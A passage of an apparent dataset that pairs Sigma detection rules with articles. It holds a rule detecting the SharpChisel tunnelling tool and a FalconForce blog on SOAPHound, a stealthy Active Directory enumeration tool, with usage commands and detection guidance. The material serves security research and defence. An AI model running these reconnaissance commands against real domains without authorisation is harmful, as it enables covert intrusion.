      "description": "Detects usage of the Sharp Chisel via the commandline arguments",
      "references": [
        "https://github.com/shantanu561993/SharpChisel",
        "https://www.sentinelone.com/labs/wading-through-muddy-waters-recent-activity-of-an-iranian-state-sponsored-threat-actor/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-05",
      "modified": "2023-02-13",
      "tags": [
        "attack.command-and-control",
        "attack.t1090.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Image|endswith": "\\SharpChisel.exe"
          },
          {
            "Product": "SharpChisel"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_sharp_chisel.yml",
    "id": "233"
  },
  {
    "url": "https://medium.com/falconforce/soaphound-tool-to-collect-active-directory-data-via-adws-165aca78288c",
    "markdown": "# SOAPHound — tool to collect Active Directory data via ADWS\n\n**Jan 26, 2024**\n\n---\n\n## TL;DR\n\nSOAPHound is a custom-developed .NET data collector tool which can be used to enumerate Active Directory environments via the Active Directory Web Services (ADWS) protocol.\n\nSOAPHound can be used as an alternative to a number of open source security tools which are commonly used to extract Active Directory data via the LDAP protocol. SOAPHound can extract the same information without directly communicating to the LDAP server. Instead, LDAP queries are wrapped within a series of SOAP messages, which are sent to the ADWS server using a NetTCPBinding communication channel. Next, the ADWS server unwraps the LDAP queries and forwards them to the LDAP server running on the same domain controller. As a result, LDAP traffic is not sent via the wire and therefore would not be easily detected by common monitoring tools.\n\nOf course, this blog also contains some custom detections to alert you in case of SOAPHound(-like) behavior in your environment. ;-)\n\nLink to SOAPHound tool:\n- https://github.com/FalconForceTeam/SOAPHound\n\nLink to detections:\n- Detection 1\n- Detection 2\n\n**Fun fact** — Originally, we started researching the ADWS endpoint as a potential target for NTLM relaying attacks. Although such an attack is not possible due to the default configuration of ADWS servers (which enforce encryption and signing), we obtained some knowledge about the underlying protocol which led to the creation of this tool.\n\n---\n\n## Introduction\n\nAdversaries commonly use the LDAP protocol to perform Active Directory (AD) enumeration via Active Directory Lightweight Directory Services (AD LDS). They extract information on the AD schema, such as domain users, devices, groups and their underlying access rights; providing a quick overview of the organization and significantly helping in the identification of potential attack paths. The AD schema also contains information about specific services of interest, such as Active Directory Certificate Services (ADCS), internal DNS records, etc. Please refer to the References section at the end of this blog for a list of open source tools capable of performing this type of reconnaissance.\n\nDefensive tools are focused on detecting AD enumeration techniques by monitoring unexpected LDAP traffic and analyzing the exchanged information to identify uncommon and / or suspicious LDAP queries.\n\nSOAPHound is an AD enumeration tool which does not send any direct LDAP traffic to stay under the radar of monitoring tools. Instead, it uses the Active Directory Web Services (ADWS) protocol.\n\n### ADWS protocol(s)\n\nWith Windows Server 2008 R2, Microsoft introduced an alternate protocol to retrieve AD objects: Active Directory Web Services (ADWS). ADWS provides a Web service interface to Active Directory Lightweight Directory Services (AD LDS) instances that are running on the same server. ADWS is used by legitimate tools, most notably the Active Directory module for Windows PowerShell, and provides a much faster interface to retrieve LDAP data.\n\n```image\nAlt: ADWS Protocol\nDescription: The image illustrates the communication flow between a user and Active Directory Web Services (ADWS). It shows a user represented by an icon at the top left connecting to ADWS via WCF NetTCPBinding. Below ADWS, the diagram depicts its interaction with the Lightweight Directory Access Protocol (LDAP) and Active Directory Lightweight Directory Services (AD LDS), ultimately connecting to the Domain Controller (DC). The diagram effectively visualizes the components involved and the flow of information in the context of ADWS.\nTranscription: |\n  ┌──────────────┐\n  │              │\n  │   WCF        │\n  │ NetTCPBinding│\n  │              │\n  └──────┬───────┘\n         │\n         ▼\n  ┌──────────────┐\n  │              │\n  │     ADWS     │\n  │              │\n  └──────┬───────┘\n         │\n         ▼\n  ┌──────────────┐\n  │              │\n  │     LDAP     │\n  │              │\n  └──────┬───────┘\n         │\n         ▼\n  ┌──────────────┐\n  │              │\n  │    AD LDS    │\n  │              │\n  └──────┬───────┘\n         │\n         ▼\n  ┌──────────────┐\n  │              │\n  │      DC      │\n  │              │\n  └──────────────┘\n```\n\nThe ADWS server is listening on TCP port 9389 of domain controllers and facilitates SOAP-based search operations against directory services. It is compatible with LDAP filters, so it is possible to perform specific search queries and retrieve only the required properties. In fact, when ADWS is used, the DC performs LDAP requests internally to retrieve the results, in the context of the user sending the SOAP messages. For more information, please refer to the relevant Microsoft documentation.\n\nADWS clients (e.g., via the Active Directory PowerShell module) establish a NetTCPBinding session with the server, generating a run-time communication stack which uses transport security, TCP for message delivery, and a binary message encoding. This binding is an appropriate Windows Communication Foundation (WCF), system-provided choice for communicating with the ADWS server.\n\nThe ADWS protocol supports various protocols to send SOAP messages over TCP, such as:\n- MS-WSTIM (WS Transfer Identity Management)\n- WXFR (Web services transfer)\n- WSENUM (Web services enumeration)\n- MS-WSDS (WS Enumeration Directory Services)\n- MS-ADDM (Data Model & Common Elements)\n- MS-ADCAP (Custom Action Protocol)\n- MS-NMFMB (.NET Message Framing MSMQ Binding)\n- MS-WSMAN (Web services management protocol)\n\nFor the full list of Web Services protocols used by Active Directory systems, please refer to the MS-ADSO (Active Directory System Overview).\n\n```image\nAlt: ADWS Communication\nDescription: The image appears to be a screenshot of a document page containing technical information related to the Web Services protocols supported by the Active Directory System. It lists several protocols with brief descriptions, including WS-Transfer, IMDA, WS-Enumeration, WSDS, WSPLED, and ADCAP. Each protocol is associated with operations such as reading, writing, and deleting directory objects, along with references to other documents or specifications (indicated by bracketed references). This content provides specific insights into the functioning and interoperability of Active Directory services.\nTranscription: |\n  5.3.2.4  Web Services Group\n  \n  The Web Services group of protocols is supported on some versions of the Active Directory System, as described in section 4.5.\n  \n  The Web Services protocols (except for ADCAP) operate on the XML data model described in [MS-ADDM1]. That document also describes the mapping between that XML data model and the directory objects that form the basis of the data model used in this Protocol Family System Document and in [MS-ADTS]. The following Web Services protocols and protocol extensions are supported by the Active Directory System:\n  \n  - WS-Transfer, as described in [WXFR], provides the ability to read (via a Get operation) or delete (via a Delete operation) an entire directory object. The Put and Create operations are only supported when used in conjunction with the IMDA protocol extensions.\n  \n  - IMDA, as described in [MS-WSTIM], is a set of extensions to WS-Transfer. It extends the Get and Put operations of WS-Transfer to permit directory objects (represented as XML data) to be read from and written to at the level of individual attributes, instead of requiring the client to always read and write the entire directory object. This protocol extension also contains extensions to the WS-Transfer Create operation permitting the client to specify only selected attributes of the directory object to be created, with the directory service filling in remaining attributes as necessary. The IMDA protocol is defined in terms of identity objects rather than directory objects. However, as used in the Active Directory System, an IMDA identity object is a directory object. This mapping between identity objects and directory objects is given in section 5.1.3.\n  \n  - WS-Enumeration, as described in [WSENUM], is used to retrieve directory objects (represented as XML data) that match a client-specified criteria.\n  \n  - WSDS, as described in [MS-WSDS], is a set of extensions to the WS-Enumeration protocol that describes, among other things, the query language used by the clients to specify the criteria of which directory objects should be retrieved.\n  \n  - WSPEDL, as described in [MS-WSPEDL], is a protocol extension that permits the use of LDAP version 3 extended controls with WS-Transfer and WS-Enumeration operations.\n  \n  - ADCAP, as described in [MS-ADCAP], is a protocol for managing Active Directory account information and topologies. Unlike the other Web Services protocols, it does not make use of the XML data model defined in [MS-ADDM] but rather uses its own XML representations defined in [MS-ADCAP].\n```\n\nOn network level, the SOAP messages are wrapped within the Microsoft.NET NegotiateStream Protocol Specification (MS-NNS) messages and sent over TCP streams. MS-NNS is used to establish the security context of the operations and MS-NNS in turn uses the Simple and Protected GSS-API Negotiation (SPNEGO) mechanism to determine which underlying security protocol to use. Eventually, and depending on the ADWS endpoint, SOAP messages are sent using different authentication mechanisms, as shown in the below table:\n\n```image\nAlt: ADWS Authentication\nDescription: The image depicts a segment of a PDF document titled '[MS-ADSO]', specifically focusing on the section 5.3.2.4 regarding the Web Services Group. It outlines various protocols supported by the Active Directory System, including WS-Transfer, IMDA, WS-Enumeration, and others. Each protocol is briefly described, emphasizing their functionalities related to directory object management and operations such as reading, writing, and deleting directory objects. The text is technical and provides specific details relevant to understanding the Web Services protocols in the context of Active Directory.\nTranscription: |\n  5.3.2.4  Web Services Group\n  \n  The Web Services group of protocols is supported on some versions of the Active Directory System, as described in section 4.5.\n  \n  The Web Services protocols (except for ADCAP) operate on the XML data model described in [MS-ADDM1]. That document also describes the mapping between that XML data model and the directory objects that form the basis of the data model used in this Protocol Family System Document and in [MS-ADTS]. The following Web Services protocols and protocol extensions are supported by the Active Directory System:\n  \n  - WS-Transfer, as described in [WXFR], provides the ability to read (via a Get operation) or delete (via a Delete operation) an entire directory object. The Put and Create operations are only supported when used in conjunction with the IMDA protocol extensions.\n  \n  - IMDA, as described in [MS-WSTIM], is a set of extensions to WS-Transfer. It extends the Get and Put operations of WS-Transfer to permit directory objects (represented as XML data) to be read from and written to at the level of individual attributes, instead of requiring the client to always read and write the entire directory object. This protocol extension also contains extensions to the WS-Transfer Create operation permitting the client to specify only selected attributes of the directory object to be created, with the directory service filling in remaining attributes as necessary. The IMDA protocol is defined in terms of identity objects rather than directory objects. However, as used in the Active Directory System, an IMDA identity object is a directory object. This mapping between identity objects and directory objects is given in section 5.1.3.\n  \n  - WS-Enumeration, as described in [WSENUM], is used to retrieve directory objects (represented as XML data) that match a client-specified criteria.\n  \n  - WSDS, as described in [MS-WSDS], is a set of extensions to the WS-Enumeration protocol that describes, among other things, the query language used by the clients to specify the criteria of which directory objects should be retrieved.\n  \n  - WSPEDL, as described in [MS-WSPEDL], is a protocol extension that permits the use of LDAP version 3 extended controls with WS-Transfer and WS-Enumeration operations.\n  \n  - ADCAP, as described in [MS-ADCAP], is a protocol for managing Active Directory account information and topologies. Unlike the other Web Services protocols, it does not make use of the XML data model defined in [MS-ADDM] but rather uses its own XML representations defined in [MS-ADCAP].\n```\n\n---\n\n## Development challenges\n\nUnderstanding the protocols used by ADWS was a huge challenge on its own, since limited documentation was publicly available to help us develop a custom enumeration tool. However, the amazing work of Vincent Le Toux in the PingCastle project provided great insights on how to use ADWS to extract Active Directory data and helped us tremendously in both realizing the potential of the protocol, as well as developing the initial versions of SOAPHound.\n\n### Challenge #1 — Debugging\n\nOur first challenge when playing around with the ADWS protocol was to debug the actual traffic sent to the ADWS server. Initially, we used the PowerShell AD module as our client, which is the most common tool using this protocol.\n\nRunning a simple `Get-ADUser` command within a Windows Domain context shows basic information of the requested user object:\n\n```image\nAlt: Get-ADUser Command\nDescription: The image displays a PowerShell terminal output showing the result of the command 'Get-ADUser'. It lists various attributes of an Active Directory user identified as 'lynx', including 'DistinguishedName', 'Enabled' status, 'GivenName', 'ObjectGUID', 'SamAccountName', 'SID', and 'UserPrincipalName'. This output is relevant for collecting Active Directory data, making it informative in the context of the discussion on debugging and working with the ADWS protocol.\nTranscription: |\n  PS C:\\> Get-ADUser -Identity lynx -Credential ballpit\\lynx -Server 10.93.4.10\n  DistinguishedName  : CN=lynx,CN=Users,DC=ballpit,DC=int\n  Enabled            : True\n  GivenName          : lynx\n  Name               : lynx\n  ObjectClass        : user\n  ObjectGUID         : fe0e857c-1fb8-455b-91e5-5c13c89fae2a\n  SamAccountName     : lynx\n  SID                : S-1-5-21-3123861462-3494191311-3379867880-2605\n  Surname            :\n  UserPrincipalName  : lynx@ballpit.int\n```\n\nUsing Wireshark didn’t provide much help, since it can only identify that the MS-NNS protocol is used, but all underlying traffic is encrypted.\n\nThis default applied encryption is also shown by reversing the ADWS server binary, showing that “EncryptAndSign” protection level is enforced by default:\n\n```image\nAlt: ADWS Encryption\nDescription: The image depicts a portion of source code related to Microsoft's Active Directory Web Services (ADWS). It shows the configuration settings, specifically the security binding for the ADWS, highlighting that the encryption method used is 'TransportWithMessageCredential' with 'EncryptAndSign' protection. This is crucial for understanding how traffic is secured when using ADWS.\nTranscription: |\n  Microsoft.ActiveDirectory.WebServices (0.0.0.0)\n    - Type References\n    - References\n    - Resources\n  \n  Microsoft.ActiveDirectory.WebServices\n    - ADWebServiceVersion: 00000007\n    - ADWebServiceBindingDescriptor: 00000001\n    - ADWebService: 00000000\n    - ADWSHost: 00000005\n    - ADWSVersion: 00000003\n    - ADWSPort: 0000000C\n    - ADWSSetup: 00000001\n    - ADTransportBindingMessageCredentialBindingDescriptor: 00000000\n  \n  catch (configurationErrorsException ex)\n  {\n      GlobalDebug.WriteLineIf(GlobalDebug.Error, \"ADWSHostFactory\", \"CreateAdsTransportIdMessageCredentialBinding: {0}\", new object[]\n      {\n          ex.ToString()\n      });\n      EventLog.Log((long)(-1073741811), new object[]\n      {\n          AdsConstants.NetBindingConfigName,\n          ex.Message\n      });\n  }\n  \n  netBinding.Namespace = \"http://schemas.microsoft.com/2005/06/identitydirectory\";\n  netBinding.Security.Mode = SecurityMode.TransportWithMessageCredential;\n  netBinding.Security.MessageSecurityVersion = MessageSecurityVersion.Encrypted;\n```\n\nHowever, debugging can be enabled on the server side by enabling WCF logging through the ADWS configuration file, located in “C:\\Windows\\ADWS\\Microsoft.ActiveDirectory.WebServices.exe.config” on the domain controller, as detailed here.\n\n---\n\n### Challenge #2 — Creating service definition code from WSDL\n\nThe second challenge was to create the structure of the SOAP messages that are accepted by the ADWS server. The code definition files are available in WSDL format on the *mex* endpoint of the ADWS server, which is located in `net.tcp://<dc>:9389/ActiveDirectoryWebServices/mex`.\n\nVisual Studio or Visual Studio Code can be used to create the service references via the WCF web service endpoint and create the basic code needed to send messages to the ADWS SOAP endpoints. However, the service references do not define the exact structure of these messages.\n\n```image\nAlt: WSDL Files\nDescription: The image shows a user interface for adding a service reference in a development environment, likely Visual Studio. It displays a dialog titled \"Add Service Reference,\" where the user can enter a specific service URL. The address provided is 'net.tcp://dc1-ballpit.ballpit.int:9389/ActiveDirectoryWebServices/mex.' Under the 'Services' section, the 'ActiveDirectoryWebService' is listed, showing several operations such as AccountManagement, Resource, ResourceFactory, Search, and TopologyManagement. The interface allows the selection of a service contract to view its operations.\nTranscription: |\n  Add Service Reference\n  \n  To see a list of available services on a specific server, enter a service URL and click Go. To browse for available services, click Discover.\n  \n  Address:\n  net.tcp://dc1-ballpit.ballpit.int:9389/ActiveDirectoryWebServices/mex\n  \n  Services:                          Operations:\n  ActiveDirectoryWebService          [Select a service contract to view its operations.]\n    - AccountManagement\n    - Resource\n    - ResourceFactory\n    - Search\n    - TopologyManagement\n  \n  1 service(s) found at address 'net.tcp://dc1-ballpit.ballpit.int:9389/ActiveDirectoryWebServices/mex'.\n  \n  Namespace:\n  ServiceReference1\n  \n  [Advanced...] [OK] [Cancel]\n```\n\nBased on the ADWS debug log files, we observed the correct structure of the XML messages. These XML messages heavily use ‘XML namespacing’, which makes it a bit tricky to produce XML messages in the same structure. After some back and forth with ChatGPT, we generated C# code that could produce XML messages in the required format.\n\nThe key point is that multiple requests are needed to run an LDAP query via ADWS. First, an enumeration request is sent that contains the query to run and which properties to return. The response contains an ‘EnumerationContext’ which can be used to pull the actual results.\n\n---\n\n### Challenge #3 — nTSecurityDescriptor attribute\n\nThe nTSecurityDescriptor is one of the most crucial LDAP attributes to enumerate, since it contains the Access Control Entries (ACEs), owner information, and inheritance assigned to the object. If parsed properly, it can lead to the identification of attack paths within an Active Directory environment (thanks to Bloodhound).\n\nThe nTSecurityDescriptor is a binary data structure of changeable length that contains security information associated with an object using the Security Descriptor Definition Language (SDDL) format.\n\n```image\nAlt: nTSecurityDescriptor\nDescription: The image displays a pop-up window titled 'Attribute Properties' that details the nTSecurityDescriptor attribute of an Active Directory object. It includes specific information such as the attribute name, object distinguished name (DN), syntax type, schema, and its values. The values appear to be a complex string of identifiers and permissions related to the nTSecurityDescriptor, which is crucial for understanding access control within Active Directory.\nTranscription: |\n  Attribute Properties\n  --------------------\n  Attribute:                nTSecurityDescriptor\n  Object:                   CN=WS1,OU=ff-computers,DC=balpit,DC=int\n  Syntax:                   NTSecurityDescriptor\n  Schema:                   CN=NT-Security-Descriptor,CN=Schema,CN=Configuration,DC=\n  \n  Values:                   D:AI(OA;;WP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf96786-0de6-11d0-9819-00a040052b2c;;WD);OA;;SW;72e395747-b18-11d1-ade0-04fd8d8d52;P:ba0e6-11d0-a285-00a0030493e2;R:RU;OA;CilOID;RP:8c2ac240-79a5-11d0-9020-00a28500a003;AE;ED)(OA;CI)(OID;RP;7c69e6d2-2c7-11d2-854e-00a0c9837608;CRSDRCWDOW;;;BA)\n```\n\nInitially, our attempts to retrieve the nTSecurityDescriptor attributes of objects failed due to permission errors. The reason was explained in this blog post. The nTSecurityDescriptor attribute contains 4 separate pieces of information: DACL (Discretionary ACL), SACL (System ACL), Owner, and Primary Group. When you query Active Directory it will attempt by default to retrieve all parts of the security descriptor. However, your account may not have access to all parts (most notably, the SACL). When this happens, AD decides to simply not return anything. To get around the limitation above and still query the nTSecurityDescriptor, you need to use an LDAP control to specify you do not want the SACL. The control is `LDAP_SERVER_SD_FLAGS_OID`.\n\nAs a result, we added the above control in our EnumerationContext requests, which resulted in proper retrieval of nTSecurityDescriptor attributes via ADWS.\n\n```image\nAlt: nTSecurityDescriptor Example\nDescription: The image displays an XML log extracted from an event trace related to the Active Directory Web Services (ADWS). It includes detailed structured information such as the event time, source, and various attributes relevant to an enumeration context in Active Directory. The XML showcases elements such as EventID, EventType, and ApplicationData that are essential for understanding the security descriptor retrieval process, particularly in relation to the nTSecurityDescriptor attribute.\nTranscription: |\n  <EZTraceEvent xmlns=\"http://schemas.microsoft.com/2004/06/EZTraceEvent\">\n    <System xmlns=\"http://schemas.microsoft.com/2004/06/windows/eventlog/system\">\n      <EventID>0</EventID>\n      <SubType>5</SubType>\n      <Level>Information</Level>\n      <TimeCreated SystemTime=\"2024-01-05T09:06:28.9158137\" />\n      <Correlation ActivityID=\"{00000000-0000-0000-0000-000000000000}\" />\n      <Channel>Application</Channel>\n      <Computer>DCL-BALPIT</Computer>\n    </System>\n    <ApplicationData>\n      <MSExchangeLogTraceRecord>\n        <TraceData>\n          <EventTime>2024-01-05T10:06:28.9158131+01:00</EventTime>\n          <Source>ServiceLevelReceiveRequest</Source>\n          <Message>https://www.w3.org/2003/05/soap-envelope</Message>\n          <Header>\n            <Action xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">http://www.w3.org/2009/enumeration/Pull</Action>\n            <MessageID>urn:uuid:2d1e1dec-4d1c-42de-9256-d78352966028</MessageID>\n            <ReplyTo>\n              <Address>http://schemas.xmlsoap.org/ws/2004/09/enumeration/anonymous</Address>\n            </ReplyTo>\n            <To>http://www.w3.org/2004/09/enumeration</To>\n          </Header>\n          <Body>\n            <EnumerationContext>9a2c246f-6164-4b4b-37b1a79638</EnumerationContext>\n            <Control>\n              <add controlValue=\"1-2.840.113556.1.4.803\" />\n              <add controlValue xsi:type=\"xsd:base64Binary\">MIAQAAAAADgEH</add>\n            </Control>\n          </Body>\n        </TraceData>\n      </MSExchangeLogTraceRecord>\n    </ApplicationData>\n  </EZTraceEvent>\n```\n\n---\n\n### Challenge #4 — Optimize size and stealthiness\n\nAnother point of interest was to stay under the radar of monitoring tools. Not only regarding the network traffic (which was more or less sorted by design, by using ADWS protocol), but also in the actual LDAP queries being sent by the tool. We did not want to trigger detections by using known LDAP enumeration queries for different types of objects, such as Users, Computers, etc. Instead, being inspired by ADExplorer’s snapshot capability, we implemented SOAPHound collection methods as follows. We first retrieve all objects of Active Directory and then process the different types (i.e., User, Computer, Group, Domain, GPO, Container). This allows us to send a minimum number of LDAP queries and retrieve all information that we need to create the BloodHound output.\n\nWhen creating a snapshot with ADExplorer, you retrieve all attributes of all AD objects, most of which are not really needed for Bloodhound processing. This is thus unnecessary traffic, which makes the whole process significantly slower (especially in large domains). With SOAPHound we only collect the LDAP attributes that we need (+/- 35 attributes) and therefore decrease the data transfer volume by more than 50%, compared to the ADExplorer snapshot.\n\n---\n\n### Challenge #5 — Timeout issues\n\nAt this point, we had created a working and stable version of SOAPHound, which has been thoroughly tested in our lab. However, when we tried to actually run it in a client Active Directory environment, we ran into a timeout issue. More specifically, our LDAP request to retrieve all AD objects was failing after 30 minutes, which is the default expiration interval for EnumerationContext requests. After some additional research, we realized that the 30 minute timeout was set by default by the ADWS server and we could not renew the EnumerationContext at the client side without losing the previously obtained data. The only solution was to save the data that we have already obtained and reconnect with a new EnumerationContext request.\n\nAs a result, we came up with an idea to split the retrieval of AD objects based on the first character of each object. For example, we get all objects starting with “a” by sending the LDAP query: `(cn=a*)`, then `(cn=b*)`, and so on. The split functionality worked quite well in a couple of relatively small clients. However, it failed in a larger environment, where too many objects started with the same letter. As a result, SOAPHound’s AutoSplit mode was implemented, where we check if a certain letter has more objects than a defined threshold. If yes, we split twice for that letter, by sending LDAP queries such as `(cn=aa*)`, `(cn=ab*)` and so on. Refer to the `--autosplit` and `--threshold` options of SOAPHound tool below.\n\n---\n\n## Functionalities of the SOAPHound tool\n\nBelow we summarize the main functionalities of SOAPHound.\n\n> SOAPHound output files are compatible with BloodHound version 4.\n\n### Authentication options\n\nSOAPHound supports the following authentication methods:\n- Using the existing authentication token of the current user. This is the default option, if no username and password are supplied.\n- Supplying a username and password on the command-line (`--user` and `--password` arguments, respectively).\n\n### Connection options\n\nWhen SOAPHound runs in a domain-joined machine, it will automatically attempt to connect to the Domain Controller of the domain the machine is joined to. This can be overridden by supplying the `--dc` and `--domain` command-line arguments.\n\n### Collection methods\n\nOne of the following collection methods must be specified:\n\n```\n--buildcache: Only build cache and not perform further actions\n--bhdump: Dump BloodHound data\n--certdump: Dump AD Certificate Services (ADCS) data\n--dnsdump: Dump AD Integrated DNS data\n```\n\n#### Method 1: building the cache (`--buildcache`)\n\nSOAPHound can generate a cache file that contains basic information about all domain objects, such as Security Identifier (SID), Distinguished Name (DN), and ObjectClass. This cache file is required for BloodHound-related data collection (i.e., the `--bhdump` and `--certdump` collection methods), since it is used when crafting the trust relationships between objects via the relevant Access Control Entries (ACEs).\n\nAn example command to build the cache file is:\n\n```\nSOAPHound.exe --buildcache -c c:\\temp\\cache.txt\n```\n\nThis will generate a cache file in the `c:\\temp` folder. The cache file is a JSON-formatted mapping of basic information about all domain objects.\n\nLDAP queries being sent:\n- LDAP base: defaultNamingContext of domain\n- LDAP filter: \"(!soaphound=*)\"\n- LDAP properties: \"objectSid\", \"objectGUID\", \"distinguishedName\"\n\nTo view some statistics about the cache file (i.e., the number of domain objects starting with each letter), you can use the `--showstats` command-line argument:\n\n```\nSOAPHound.exe --showstats -c c:\\temp\\cache.txt\n```\n\nShowstats runs locally and does not send any network traffic.\n\n#### Method 2: collecting BloodHound Data (`--bhdump`)\n\nAfter the cache file has been generated, you can use the `--bhdump` collection method to collect data from the domain that can be imported into BloodHound.\n\nAn example command to collect BloodHound data is below. Do note that this references the cache file generated in the previous step:\n\n```\nSOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output\n```\n\nLDAP queries being sent:\n- LDAP base: defaultNamingContext of domain\n- LDAP filter: \"(!soaphound=*)\"\n- LDAP properties: \"name\", \"sAMAccountName\", \"cn\", \"dNSHostName\", \"objectSid\", \"objectGUID\", \"primaryGroupID\", \"distinguishedName\", \"lastLogonTimestamp\", \"pwdLastSet\", \"servicePrincipalName\", \"description\", \"operatingSystem\", \"sIDHistory\", \"nTSecurityDescriptor\", \"userAccountControl\", \"whenCreated\", \"lastLogon\", \"displayName\", \"title\", \"homeDirectory\", \"userPassword\", \"unixUserPassword\", \"scriptPath\", \"adminCount\", \"member\", \"msDS-Behavior-Version\", \"msDS-AllowedToDelegateTo\", \"gPCFileSysPath\", \"gPLink\", \"gPOptions\"\n\nIf the targeted domain does not use LAPS, you can use the `--nolaps` command-line argument to skip the LAPS-related data collection.\n\nThis command will generate the `c:\\temp\\bloodhound-output` folder and produces a number of JSON files that can be imported into BloodHound.\n\nThe JSON files contain the collected Users, Groups, Computers, Domains, GPOs and Containers, including their relationships.\n\n#### Method 3: collecting ADCS Data (`--certdump`)\n\nAfter the cache file has been generated, you can use the `--certdump` collection method to collect ADCS data from the domain that can be imported into BloodHound. ADCS output data is classified as GPOs in BloodHound.\n\nThis collection method does not support the `--autosplit` and `--threshold` command-line arguments. An example command to collect ADCS data is below. Note that this references the cache file generated in a previous step:\n\n```\nSOAPHound.exe -c c:\\temp\\cache.txt --certdump -o c:\\temp\\bloodhound-output\n```\n\nThis command will generate the `c:\\temp\\bloodhound-output` folder and produce two JSON files that can be imported into BloodHound, containing information about the Certificate Authorities (CA) and Certificate Templates.\n\nLDAP queries being sent:\n- Create cache of Certificate templates\n  - LDAP Base: \"CN=Configuration,DC=domain,DC=com\"\n  - LDAP Filter: \"(!soaphound=*)\"\n  - LDAP properties: \"name\", \"certificateTemplates\"\n\n- Dump ADCS data\n  - LDAP Base: \"CN=Configuration,DC=domain,DC=com\"\n  - LDAP Filter: \"(!soaphound=*)\"\n  - LDAP properties: \"name\", \"displayName\", \"nTSecurityDescriptor\", \"objectGUID\", \"dNSHostName\", \"nTSecurityDescriptor\", \"certificateTemplates\", \"cACertificate\", \"msPKI-Minimal-Key-Size\", \"msPKI-Certificate-Name-Flag\", \"msPKI-Enrollment-Flag\", \"msPKI-Private-Key-Flag\", \"pKIExtendedKeyUsage\", \"pKIOverlapPeriod\", \"pKIExpirationPeriod\"\n\n#### Method 4: collecting AD-integrated DNS data (`--dnsdump`)\n\nBesides BloodHound data, SOAPHound can also be used to collect AD-integrated DNS data. This does not require a cache file and does not support the `--autosplit` and `--threshold` command-line arguments.\n\nAn example command to collect AD Integrated DNS data is:\n\n```\nSOAPHound.exe --dnsdump -o c:\\temp\\dns-output\n```\n\nThis command will generate a file `DNS.txt` in the `c:\\temp\\dns-output` folder that contains a dump of all the AD-integrated DNS data.\n\nLDAP queries being sent:\n- LDAP base: \"CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=com\"\n- LDAP filter: \"(&amp;(ObjectClass=dnsNode))\"\n- LDAP properties: \"Name\", \"dnsRecord\"\n\n---\n\n## Detecting SOAPHound\n\nAt FalconForce, we always strive to release detections along with any offensive security content that we create. There are a number of ways in which information gathering attempts using SOAPHound can be detected.\n\n### Revisiting previous FalconFriday detections in the context of ADWS\n\nWe previously released a FalconFriday blog post about detecting Active Directory data collection in 2021: Detecting Active Directory Data Collection.\n\nThis 2021 blog post described three methods to detect the collection:\n1. Client-side LDAP query logging using Microsoft Defender for Endpoint.\n2. Domain controller LDAP query logging via Microsoft Defender for Identity.\n3. Domain controller object access logging via SACLs and audit policies.\n\nIn this section we will evaluate how well these detections work in the context of ADWS.\n\n#### 1. Client-side LDAP query logging using Microsoft Defender for Endpoint\n\nThe first method (using Client-side LDAP query logging collected by Microsoft Defender for Endpoint (MDE)) turns out not to be very effective against ADWS based collection.\n\nTo understand why this method is less effective we have to take the ‘capping‘ mechanism of MDE into consideration. This capping mechanism ensures that the amount of telemetry collected per machine remains within reasonable limits. For example, if a machine generates millions of LDAP queries per day, this would lead to a very large amount of telemetry being collected and stored.\n\nWe discovered that for LDAP queries the following capping is applied by the MDE agent:\n- Within a 24 hour period only one entry is logged if the SearchFilter, DistinguishedName and Initiating process are the same.\n- A maximum of 1000 LDAP queries are logged per machine per day, regardless of the source process.\n\nBased on our own testing, the 1000 LDAP queries per day per machine can be reached within 10 minutes on a typical domain controller in an enterprise environment. This means that there are massive blind-spots in the LDAP queries performed via the ADWS service, since this will typically be deployed on domain controllers and the ADWS process on the domain controller is responsible for making the LDAP queries.\n\nAnother downside of this detection method is that if the query is logged there is nothing in the telemetry linking it to the user or the device performing the ADWS collection. Making it hard to investigate any alert triggered.\n\n#### 2. Domain controller LDAP query logging via Microsoft Defender for Identity\n\nThe second method used in our original blog post relies on the telemetry collected from the AD server by the Microsoft Defender for Identity (MDI) agent. The downside of this detection method is that it only records LDAP queries that it finds suspicious. It is possible for an attacker to modify the exact LDAP queries used; to make them appear as benign. For example, by avoiding the usage of `ObjectClass=*`. Since most queries performed by SOAPHound at this time are not considered to be suspicious by MDI, it is hard to use this method to detect collection. Unfortunately, the identification of which queries are considered to be suspicious in MDI cannot be configured by using a method similar to custom detections.\n\n#### 3. Domain controller object access logging via SACLs and audit policies\n\nThe third detection from the original blog is based on the number of AD objects accessed by a user compared to a baseline of how many objects are typically accessed. **In our testing, this method works regardless of the exact collection method being used.** For this detection the usage of ADWS does not make a difference when compared to LDAP. However, the existing caveats for this detection remain: it requires a custom SACL to be configured to enable logging of all directory object access, which will result in a large volume of logs being generated.\n\n### Building detections specific to ADWS-based data collection\n\nThis leaves us with detections that specifically target the collection using ADWS. We identified two methods of doing this.\n\nThe first is by looking at the source process for connections to ADWS, based on the target port that is used: 9389. To reduce false positives for other traffic over this port that is not aimed at ADWS, we can filter this traffic to only include IPs where the `microsoft.activedirectory.webservices.exe` binary is running. This only works when the target machine is also enrolled in MDE.\n\nIn a typical environment there are only a handful of programs that are making connections to the ADWS service:\n- Active Directory Administrative Center (dsac.exe)\n- Microsoft Monitoring Agent\n- PowerShell\n\nBased on this, we can create a detection that will trigger when a process outside of this list makes a connection to ADWS.\n\nThis first query is available on our Github account: ADWS Connection from Unexpected Binary.\n\nThe first detection has an issue where an attacker can inject malicious code into one of the allowed processes. To detect this behavior, we can create a second rule that looks at the combination of a process injection targeting a process and that process subsequently making an ADWS connection.\n\nThis second query is available on our Github account: ADWS Connection from Process Injection Target.\n\n---\n\n## Conclusion\n\nInformation gathering methods in Active Directory were already challenging to detect. The release of this new tool that targets ADWS instead of directly targeting LDAP further increases the need for custom detections in this area. The existing method based on the number of AD Objects being accessed by a user is still the most reliable way to detect data collection, but it does require a custom SACL to be configured and has a high log volume. Existing telemetry can be used to specifically detect the ADWS-based collection, by looking at the source processes making ADWS connections.\n\n---\n\n## References\n- SharpHound (GitHub)\n- 